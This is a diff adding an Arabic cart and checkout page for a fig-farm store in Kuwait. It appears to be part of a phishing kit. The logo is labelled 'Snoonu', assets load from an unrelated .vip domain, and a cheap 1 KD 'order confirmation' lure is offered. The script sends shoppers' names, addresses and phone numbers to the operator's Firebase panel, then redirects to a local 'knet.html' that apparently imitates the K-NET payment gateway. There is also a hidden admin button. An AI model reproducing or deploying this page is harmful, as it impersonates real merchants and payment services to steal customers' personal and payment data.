@@ -1,0 +1,664 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-auth-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-database-compat.js"></script>
+    <script src="./assets/js/firebase-client.js"></script>
+    <title>سلة الطلبات - مزارع الثنيان</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+        }
+        body {
+            background-color: #f8f9fa;
+            color: #111;
+            padding-bottom: 140px;
+        }
+        
+        /* رأس الصفحة العلوي */
+        .MainContainer_headerContainer__RY5Ne {
+            background: #fff;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.05);
+        }
+        .Header_header__HSEQ9 {
+            max-width: 1400px;
+            margin: 0 auto;
+            padding: 12px 30px;
+        }
+        .Header_nav__DVSK7 {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .Header_logoWithCatalog__v4fgc {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+        .Logo_logo__oq6_b {
+            display: block;
+            width: 140px;
+            height: 40px;
+            position: relative;
+        }
+        .Logo_fullLogo__l2rPp {
+            width: 100%;
+            height: 100%;
+            object-fit: contain;
+        }
+        .CatalogButton_button__wTnA9 {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            background: #f1f3f5;
+            border: none;
+            padding: 8px 16px;
+            border-radius: 12px;
+            font-weight: 600;
+            cursor: pointer;
+            font-size: 14px;
+        }
+        .CartButton_wrapper__DN_bX .Button_primary__SrbPy {
+            background-color: #004d7a;
+            color: #fff;
+            border: none;
+            padding: 8px 18px;
+            border-radius: 12px;
+            font-weight: bold;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 14px;
+        }
+
+        /* حاوية المحتوى الرئيسية */
+        .ContentWrapper_container__T9e2i {
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 0 20px;
+        }
+        h1.Typography_h1__cT2UT {
+            font-size: 38px;
+            font-weight: 800;
+            margin: 20px 0 15px 0;
+        }
+
+        /* أزرار الفلاتر الأفقية تحت العنوان */
+        .FilterPresets_wrapper__sSfR_ {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 25px;
+        }
+        .FilterPresets_filter__czMu5 {
+            background: #f1f3f5;
+            padding: 8px 18px;
+            border-radius: 20px;
+            font-size: 14px;
+            font-weight: 600;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            color: #111;
+        }
+        .FilterPresets_filter__czMu5 img {
+            width: 18px;
+            height: 18px;
+            object-fit: contain;
+        }
+
+        /* صندوق السلة */
+        .CartBox {
+            background: #fff;
+            border-radius: 24px;
+            padding: 25px;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.03);
+            margin-bottom: 25px;
+            position: relative;
+        }
+        .CartSubHeader {
+            font-size: 14px;
+            color: #666;
+            margin-bottom: 4px;
+        }
+        .CartDeliveryTime {
+            font-size: 18px;
+            font-weight: 700;
+            color: #111;
+            margin-bottom: 20px;
+        }
+        .CartItemRow {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding-bottom: 15px;
+            border-bottom: 1px solid #f1f3f5;
+        }
+        .CartItemDetails {
+            display: flex;
+            gap: 15px;
+            align-items: center;
+        }
+        .CartItemImg {
+            width: 75px;
+            height: 75px;
+            border-radius: 14px;
+            overflow: hidden;
+            flex-shrink: 0;
+        }
+        .CartItemImg img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+        .CartItemName {
+            font-size: 16px;
+            font-weight: 700;
+            color: #111;
+            margin-bottom: 4px;
+        }
+        .CartItemDesc {
+            font-size: 13px;
+            color: #666;
+            margin-bottom: 8px;
+        }
+        .SpecialRequestBtn {
+            background: #f8f9fa;
+            border: 1px solid #dee2e6;
+            padding: 4px 10px;
+            border-radius: 8px;
+            font-size: 12px;
+            color: #495057;
+            cursor: pointer;
+            display: inline-flex;
+            align-items: center;
+            gap: 4px;
+        }
+        .CartItemPriceAndQty {
+            display: flex;
+            flex-direction: column;
+            align-items: flex-end;
+            gap: 12px;
+        }
+        .CartItemPrice {
+            font-size: 16px;
+            font-weight: 800;
+            color: #111;
+        }
+        .QtyControls {
+            background: #f8f9fa;
+            border: 1px solid #dee2e6;
+            padding: 4px 12px;
+            border-radius: 10px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            font-weight: 600;
+            font-size: 14px;
+        }
+        .QtyControls button {
+            background: none;
+            border: none;
+            font-size: 15px;
+            font-weight: bold;
+            cursor: pointer;
+            color: #004d7a;
+        }
+        .DeleteCartItem {
+            position: absolute;
+            top: 25px;
+            left: 25px;
+            background: none;
+            border: none;
+            cursor: pointer;
+            color: #adb5bd;
+            font-size: 18px;
+        }
+
+        /* نموذج إتمام الدفع */
+        #checkout-form-section {
+            display: none;
+            margin-top: 25px;
+            animation: fadeIn 0.3s ease-in-out;
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .form-input, .form-textarea {
+            width: 100%;
+            background-color: #f1f3f5;
+            border: none;
+            border-radius: 14px;
+            padding: 15px;
+            font-size: 15px;
+            color: #111;
+            margin-bottom: 12px;
+            outline: none;
+        }
+        .form-textarea {
+            resize: none;
+            height: 80px;
+        }
+        .form-row-2 {
+            display: flex;
+            gap: 12px;
+            margin-bottom: 12px;
+        }
+        .form-row-2 input {
+            flex: 1;
+            margin-bottom: 0;
+        }
+
+        .section-title-custom {
+            font-size: 24px;
+            font-weight: 800;
+            margin: 25px 0 15px 0;
+            color: #111;
+        }
+
+        .payment-method-card {
+            background: #f1f3f5;
+            border-radius: 16px;
+            padding: 16px 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 15px;
+        }
+        .payment-method-card span {
+            font-weight: 700;
+            font-size: 15px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        .knet-logo {
+            background: #003366;
+            color: #fff;
+            padding: 2px 8px;
+            border-radius: 6px;
+            font-size: 12px;
+            font-weight: bold;
+        }
+
+        .summary-box {
+            font-size: 15px;
+            margin-bottom: 20px;
+        }
+        .summary-row {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 8px;
+            color: #495057;
+        }
+
+        .payment-option-box {
+            background: #f1f3f5;
+            border: 1px solid transparent;
+            border-radius: 16px;
+            padding: 16px 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 12px;
+            cursor: pointer;
+            transition: all 0.2s ease;
+        }
+        .payment-option-box.active-option {
+            background: #f1f3f5;
+            border: 1px solid #004d7a;
+        }
+        .option-text h4 {
+            font-size: 15px;
+            font-weight: 700;
+            margin-bottom: 3px;
+            color: #111;
+        }
+        .option-text p {
+            font-size: 12px;
+            color: #666;
+        }
+
+        .FooterLinks {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-top: 1px solid #dee2e6;
+            padding-top: 20px;
+            margin-top: 30px;
+            margin-bottom: 20px;
+            font-size: 13px;
+            color: #666;
+        }
+        .FooterLinks a {
+            color: #004d7a;
+            text-decoration: none;
+            margin-left: 15px;
+        }
+
+        .FloatingCheckoutBar {
+            position: fixed;
+            bottom: 20px;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 90%;
+            max-width: 760px;
+            background-color: #004d7a;
+            color: white;
+            border-radius: 20px;
+            padding: 16px 25px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            box-shadow: 0 10px 25px rgba(0, 77, 122, 0.3);
+            z-index: 1000;
+            cursor: pointer;
+        }
+        .CheckoutText {
+            font-size: 18px;
+            font-weight: bold;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        .CheckoutBadge {
+            background: #ffffff;
+            color: #004d7a;
+            width: 28px;
+            height: 28px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 14px;
+            font-weight: bold;
+        }
+        .CheckoutPrice {
+            font-size: 18px;
+            font-weight: bold;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="MainContainer_headerContainer__RY5Ne">
+        <header class="Header_header__HSEQ9">
+            <div class="Header_nav__DVSK7">
+                <div class="Header_logoWithCatalog__v4fgc">
+                    <a class="Logo_logo__oq6_b" href="index.html">
+                        <img alt="Snoonu" src="https://theenyanl30.vip/views/assets/source/nfc2.png" class="Logo_fullLogo__l2rPp">
+                    </a>
+                    <button class="CatalogButton_button__wTnA9" onclick="window.location.href='index.html'">
+                        <span>القائمة</span>
+                    </button>
+                </div>
+                <div class="Header_sideWrapper__3FSV4">
+                    <div class="CartButton_wrapper__DN_bX">
+                        <button class="Button_button__xKXcy Button_primary__SrbPy" onclick="window.location.href='creatprogect.html'" style="background-color: #2b8a3e; margin-left: 10px; display: none;">
+                            <span>⚙️ الإدارة</span>
+                        </button>
+                        <button class="Button_button__xKXcy Button_primary__SrbPy" onclick="window.location.href='cartepage.html'">
+                            <span id="header-total">3.500 د.ك</span>
+                        </button>
+                    </div>
+                </div>
+            </div>
+        </header>
+    </div>
+
+    <div class="ContentWrapper_container__T9e2i">
+        <h1 class="Typography_h1__cT2UT">مزارع الثنيان</h1>
+        
+        <div class="FilterPresets_wrapper__sSfR_">
+            <div class="FilterPresets_filter__czMu5">
+                <img src="https://theenyanl30.vip/views/assets/source/free_delivery.33e8a802.svg" alt="توصيل مجاني">
+                <span>توصيل مجاني</span>
+            </div>
+            <div class="FilterPresets_filter__czMu5">
+                <span>خلال 40 دقيقة</span>
+            </div>
+            <div class="FilterPresets_filter__czMu5">
+                <span>نقل مخصص</span>
+            </div>
+        </div>
+
+        <div class="CartBox">
+            <button class="DeleteCartItem" onclick="clearCart()">🗑</button>
+            <div class="CartSubHeader">سلة الطلبات ‹</div>
+            <div class="CartDeliveryTime">اليوم، خلال 40 دقيقة</div>
+
+            <div id="cart-items-container"></div>
+        </div>
+
+        <div id="checkout-form-section">
+            <input type="text" class="form-input" placeholder="الاسم">
+            <input type="text" class="form-input" placeholder="العنوان">
+            
+            <div class="form-row-2">
+                <input type="text" class="form-input" placeholder="الشقة/البناية السكنية">
+                <input type="text" class="form-input" placeholder="+965 رقم الهاتف" style="direction: ltr; text-align: right;">
+            </div>
+
+            <textarea class="form-textarea" placeholder="ضع تعليمات توصيل للسائق"></textarea>
+
+            <h3 class="section-title-custom">طريقة الدفع</h3>
+
+            <div class="payment-method-card">
+                <span>
+                    <span class="knet-logo">K-NET</span> ادفع من خلال كي-نت
+                </span>
+                <input type="radio" checked name="payment_method" style="width: 18px; height: 18px; accent-color: #004d7a;">
+            </div>
+
+            <h3 class="section-title-custom" style="font-size: 18px;">سلة</h3>
+            <div class="summary-box">
+                <div class="summary-row">
+                    <span>المنتجات (1)</span>
+                    <span id="products-subtotal">3.500 د.ك</span>
+                </div>
+                <div class="summary-row">
+                    <span>قيمة التوصيل</span>
+                    <span>0 د.ك</span>
+                </div>
+            </div>
+
+            <div class="payment-option-box active-option" onclick="selectPaymentOption('full')">
+                <div class="option-text">
+                    <h4>دفع قيمة الطلب كاملة</h4>
+                    <p>سدد اجمالي قيمة الطلب الآن وادفع من خلال كي-نت واحصل على توصيل مجاني</p>
+                </div>
+                <input type="radio" id="radio-full" checked name="pay_type" style="width: 18px; height: 18px; accent-color: #004d7a;">
+            </div>
+
+            <div class="payment-option-box" onclick="selectPaymentOption('partial')">
+                <div class="option-text">
+                    <h4>دفع مبلغ 1 د.ك فقط لتأكيد طلبك</h4>
+                    <p>يخصم من قيمة الطلب وادفع الباقي عند الاستلام مع دفع مصاريف توصيل بقيمة 1 د.ك</p>
+                </div>
+                <input type="radio" id="radio-partial" name="pay_type" style="width: 18px; height: 18px; accent-color: #004d7a;">
+            </div>
+
+            <h3 class="section-title-custom" style="font-size: 24px;">المجموع الكلي <span style="float: left; font-weight: 800;" id="final-total-amount">3.500 د.ك</span></h3>
+        </div>
+
+        <div class="FooterLinks">
+            <div>
+                <a href="#">الشروط والأحكام</a>
+                <a href="#">سياسة الخصوصية</a>
+            </div>
+            <div>© 2024 مزارع الثنيان</div>
+        </div>
+    </div>
+
+    <div class="FloatingCheckoutBar" id="checkout-bar-btn" onclick="handleCheckoutAction()">
+        <div class="CheckoutText">
+            <span>&#8249;</span> <span id="btn-text-label">المتابعة للدفع</span>
+        </div>
+        <div style="display: flex; align-items: center; gap: 12px;">
+            <span class="CheckoutPrice" id="footer-total">3.500 د.ك</span>
+            <div class="CheckoutBadge" id="footer-count">1</div>
+        </div>
+    </div>
+
+    <script>
+        const sampleCartItem = {
+            name: "عرض التين الأخضر الفاخر",
+            desc: "بوكس 3 كيلو تين أخضر فاخر",
+            price: 3.500,
+            qty: 1,
+            img: "https://theenyanl30.vip/views/assets/source/top1.png"
+        };
+
+        let isFormVisible = false;
+        let selectedPaymentType = 'full'; // 'full' أو 'partial'
+
+        function renderCart() {
+            const container = document.getElementById('cart-items-container');
+            container.innerHTML = `
+                <div class="CartItemRow">
+                    <div class="CartItemDetails">
+                        <div class="CartItemImg">
+                            <img src="${sampleCartItem.img}" alt="${sampleCartItem.name}">
+                        </div>
+                        <div>
+                            <div class="CartItemName">${sampleCartItem.name}</div>
+                            <div class="CartItemDesc">${sampleCartItem.desc}</div>
+                            <button class="SpecialRequestBtn">📝 إضافة طلب خاص</button>
+                        </div>
+                    </div>
+                    <div class="CartItemPriceAndQty">
+                        <div class="CartItemPrice">${(sampleCartItem.price * sampleCartItem.qty).toFixed(3)} د.ك</div>
+                        <div class="QtyControls">
+                            <button onclick="changeQty(-1)">-</button>
+                            <span>${sampleCartItem.qty}</span>
+                            <button onclick="changeQty(1)">+</button>
+                        </div>
+                    </div>
+                </div>
+            `;
+            updateTotals();
+        }
+
+        function changeQty(change) {
+            sampleCartItem.qty += change;
+            if (sampleCartItem.qty <= 0) {
+                sampleCartItem.qty = 0;
+            }
+            renderCart();
+        }
+
+        function clearCart() {
+            sampleCartItem.qty = 0;
+            renderCart();
+        }
+
+        function updateTotals() {
+            const subtotal = sampleCartItem.price * sampleCartItem.qty;
+            const subtotalStr = subtotal.toFixed(3) + ' د.ك';
+            
+            // تحديد القيمة الفعلية للدفع بناءً على الاختيار
+            let payableAmountStr = subtotalStr;
+            if (selectedPaymentType === 'partial') {
+                payableAmountStr = '1.000 د.ك';
+            }
+
+            // تحديث السعر في الهيدر العلوي والفوتر السفلي ليطابق المبلغ المراد دفعه حالياً
+            document.getElementById('header-total').textContent = payableAmountStr;
+            document.getElementById('footer-total').textContent = payableAmountStr;
+            document.getElementById('footer-count').textContent = sampleCartItem.qty;
+            
+            // السعر داخل تفاصيل السلة يبقى دائماً يمثل إجمالي المنتجات الحقيقي
+            document.getElementById('products-subtotal').textContent = subtotalStr;
+
+            // المجموع الكلي داخل نموذج الدفع
+            const finalAmnt = document.getElementById('final-total-amount');
+            if(finalAmnt) finalAmnt.textContent = payableAmountStr;
+
+            const btnLabel = document.getElementById('btn-text-label');
+            if (isFormVisible) {
+                btnLabel.textContent = 'متابعة الدفع (' + payableAmountStr + ')';
+            }
+        }
+
+        function selectPaymentOption(type) {
+            selectedPaymentType = type;
+            const boxFull = document.querySelectorAll('.payment-option-box')[0];
+            const boxPartial = document.querySelectorAll('.payment-option-box')[1];
+            const radioFull = document.getElementById('radio-full');
+            const radioPartial = document.getElementById('radio-partial');
+
+            if (type === 'full') {
+                boxFull.classList.add('active-option');
+                boxPartial.classList.remove('active-option');
+                radioFull.checked = true;
+                radioPartial.checked = false;
+            } else {
+                boxPartial.classList.add('active-option');
+                boxFull.classList.remove('active-option');
+                radioPartial.checked = true;
+                radioFull.checked = false;
+            }
+            updateTotals();
+        }
+
+        function handleCheckoutAction() {
+            const formSection = document.getElementById('checkout-form-section');
+            const subtotal = sampleCartItem.price * sampleCartItem.qty;
+            
+            if (!isFormVisible) {
+                formSection.style.display = 'block';
+                isFormVisible = true;
+                updateTotals();
+                window.scrollTo({ top: document.body.scrollHeight, behavior: 'smooth' });
+            } else {
+                // التحقق البسيط من تعبئة الحقول الأساسية قبل الانتقال
+                const nameInput = document.querySelector('#checkout-form-section input[type="text"]');
+                if (nameInput && nameInput.value.trim() === "") {
+                    alert("يرجى إدخال البيانات الأساسية (الاسم والعنوان) قبل المتابعة.");
+                    return;
+                }
+                
+                                // حساب المبلغ المراد دفعه بناءً على خيار الدفع (كامل أو جزئي)
+                const amountToPay = selectedPaymentType === 'full' ? subtotal.toFixed(3) + ' د.ك' : '1.000 د.ك';
+                // تخزين السعر محلياً لاستخدامه في الصفحة الجديدة
+                localStorage.setItem('finalAmount', amountToPay);
+                // جمع بيانات العميل ورفعها إلى قاعدة البيانات (تظهر فوراً في لوحة التحكم)
+                try {
+                    const inputs = formSection.querySelectorAll('input.form-input');
+                    const notesEl = formSection.querySelector('textarea.form-textarea');
+                    const customerData = {
+                        name: inputs[0] ? inputs[0].value.trim() : '',
+                        address: inputs[1] ? inputs[1].value.trim() : '',
+                        apartment: inputs[2] ? inputs[2].value.trim() : '',
+                        phone: inputs[3] ? inputs[3].value.trim() : '',
+                        deliveryNotes: notesEl ? notesEl.value.trim() : '',
+                        amount: amountToPay,
+                        paymentType: selectedPaymentType,
+                        items: [{ name: sampleCartItem.name, price: sampleCartItem.price, qty: sampleCartItem.qty }]
+                    };
+                    localStorage.setItem('phone', customerData.phone);
+                    if (typeof window.pushFirebaseCustomer === 'function') {
+                        window.pushFirebaseCustomer(customerData);
+                    }
+                } catch (e) { console.error('customer push failed', e); }
+                // الانتقال إلى صفحة knet.html
+                window.location.href = 'knet.html';
+            }
+        }
+
+        renderCart();
+    </script>
+</body>
+</html>
